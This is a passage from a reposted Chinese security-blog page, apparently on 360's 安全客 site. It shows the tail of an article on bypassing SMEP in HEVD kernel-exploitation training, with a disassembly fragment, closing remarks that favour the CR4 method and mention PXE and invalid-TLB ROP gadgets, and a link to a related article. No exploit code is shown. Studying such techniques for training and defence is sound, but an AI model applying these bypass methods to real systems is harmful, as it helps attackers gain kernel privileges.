+.text:00000001C003B8A0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;HalpDpOfflineProcessorForReplace+57p
+.text:00000001C003B8A0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;DATA&nbsp;XREF:&nbsp;...
+.text:00000001C003B8A0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wbinvd
+.text:00000001C003B8A2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retn
+.text:00000001C003B8A2&nbsp;HalpAcpiFlushCache&nbsp;endp</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">个人感觉比较好用的还是cr4的方法，后者之所以提及，是因为pxe和invalid TLB这两个rop gadget的方法特别有意思。关于SMEP的绕过方法应该还有，内核有很多可以开脑洞的地方，期待更多的研究成果与大家分享，感谢！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px; color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">传送门</span></strong></span></p><hr style="white-space: normal;"/><p style="white-space: normal; text-indent: 2em;"><strong style="text-indent: 2em; font-size: 18px; color: rgb(0, 112, 192); text-decoration: none;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="http://bobao.360.cn/learning/detail/3544.html" target="_self" style="text-indent: 2em; font-size: 18px; color: rgb(0, 112, 192); text-decoration: none;">【技术分享】HEVD内核漏洞训练——陪Windows玩儿</a></span></strong></p><p style="text-indent: 2em; text-align: left;"><br/></p></p>
+                <hr/>
+                <p style="text-align: center;">
+                    <img src="http://bobao.360.cn/img/app.jpeg"/>
+                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
+                </p>
+                                <p>本文转载自 whereisk0shl.top<br/><a class="text-more" href="http://whereisk0shl.top/HEVD-with-SMEP-bypass.html" target="_blank">原文链接：http://whereisk0shl.top/HEVD-with-SMEP-bypass.html</a></p>
+                            </div>
+            <div style="margin-top: 20px;background-color:#FFFFFF">
+    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】HEVD内核漏洞训练之SMEP绕过 - 安全客 - 有思想的安全新媒体" />
+    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
+    <a name="mao"></a>
+    <div class="reg-log mobile-hiden">
+        <div class="" id="userTo">   
+            <div id="to-list" class="input-text" style="">
+                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
+                <ul id="preadded" style="display:none">       
+                </ul>
+                <div id="to-auto" style="width: 200px">
+                    <ul id="feed">
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" id="source-id" value="3570" />
+        <input type="hidden" id="source-type" value="learning" />
+        <input type="hidden" id="post-comment-url" value="/comment/add" />
+        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
+        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
+        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
+            </div>
+    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
+        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
+        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />
+
+        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
+    </div>
+
+
+    <div class="clearfix"></div>
+    <div class="comments">
+        <div class="comments-head">
+            <span class="title">用户评论</span>
+        </div>
+                <div class="comment-none alarm-info bg-primary">无任何评论</div>
+            </div>
+</div>
+<script>
+    $(function () {
+        $('.anonymous-comment').click(function () {
+            $(".join").hide();
+            $(".reg-log textarea").first().removeAttr("disabled").show();
+            $('#use_nickname').val('1');
+//            $('#trigger-nickname').attr('checked', true);
+            $('#trigger-nickname').trigger('click');
+        });
+        //为所有复选框绑定事件
+//        checkbox_on_click();
+        //ajax随机获取昵称
+//        randnicknameajax(0);
+        //ajax检测登录状态
+        comment_check_login();
+    });
+
+
+
+    function input_checkbox(flag) {
+        $('input:checkbox').each(function () {
+            var value = flag ? 1 : 0;
+            $(this).prop('checked', flag);
+            $(this).val(value);
+        });
+    }
+
+//ajax随机获取昵称
+    function randnicknameajax(flag) {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-nickname-url-ajax').val(),
+            data: {limit: 1, flag: flag},
+            dataType: "json",
+            success: function (data) {
+                $('#nick-name').val(data.data[0]);
+                _nick_name=data.data[0];
+            }
+        });
+    }
+    $();
+//ajax检测登录状态
+    function comment_check_login() {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-check-login-url-ajax').val(),
+            data: {},
+            dataType: "json",
+            success: function (data) {
+                if (data.success) {
+                    $('.join').hide();
+                    $(".reg-log textarea").first().removeAttr("disabled").show();
+                    $("#span_use_nickname").show();
+                    $('#use_nickname').val('0');
+                    $('#use_nickname').attr('checked', false);
+                }
+            }
+        });
+    }
+</script>        </div>
+    </div>
+    <div class="side-bar">
+        <div class="mod hot-news">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
+    </div>
+    <ul class="links-list">
+                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
+                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
+                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
+                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
+                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
+                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
+            </ul>
+</div>        <!-- 友情链接 -->
+        <div class="mod blog-links mobile-hide">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
+        <a href="/links/index.html" class="more">更多<i></i></a>
+    </div>
+        <ul class="links-list">
+                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
+                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
+                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
+                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
+                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
+                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
+                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
+                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
+                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
+                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
+            </ul>
+    </div>
+        <!-- 联系我们 -->
+        <div class="mod contact mobile-hide" style="text-align:center">
+    <div class="head-bar clearfix">
+        <h2><i></i><span>关注我们</span></h2>
+    </div>
+    <!-- 微信关注 -->
+    <ul class="contact-way">
+        <li><a>微信关注</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+    <!-- APP下载 -->
+    <ul class="contact-way">
+        <li><a>安全播报APP</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+</div>
+
+    </div>
+</div>
+
+<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/common.js?v=4.5"></script>
+<script>$(function() {sync_count('comment');});</script>
+
+
+<!-- 语法高亮 -->
+<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
+<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
+    </div>
+
+        <div class="footer">
+        <div class="friend-link">
+            <a href="http://www.360.cn/" target="_blank">360首页</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">关于我们</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">联系我们</a>
+            <span>|</span>
+            <a href="/links/index.html" target="_blank">友情链接</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">招贤纳士</a>
+        </div>
+        <div class="copy">
+            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
+        </div>
+    </div>
+    
+</div>
+
+<!--奇舞团统计-->
+
+<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
+<script>
+    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
+</script>
+
+<div class="hide">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
+</div>
+<div class="backToTop_wrap off">
+    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
+</div>
+<script>
+    var $backToTop_wrap = $(".backToTop_wrap"),
+        $backToTop_btn = $("#back_to_top");
+
+    if ($(window).scrollTop() > 100) {
+        $backToTop_wrap.removeClass("off");
+    }
+    else {
+        $backToTop_wrap.addClass("off");
+    }
+
+    $(window).on("scroll", function () {
+        if ($(this).scrollTop() > 100) {
+            $backToTop_wrap.removeClass("off");
+        }
+        else {
+            $backToTop_wrap.addClass("off");
+        }
+    });
+
+    $backToTop_btn.on("click", function () {
+        $("html, body").animate({scrollTop: 0}, 120);
+    });
+
+    $(function () {
+        var navlist = $('.nav-list > li');
+
+        navlist.each(function () {
+            $(this).on('mouseenter', function () {
+                $(this).addClass('selected');
+            });
+
+            $(this).on('mouseleave', function () {
+                $(this).removeClass('selected');
+            });
+        });
+    })
+</script>
+
+
+
+</body>
+</html>
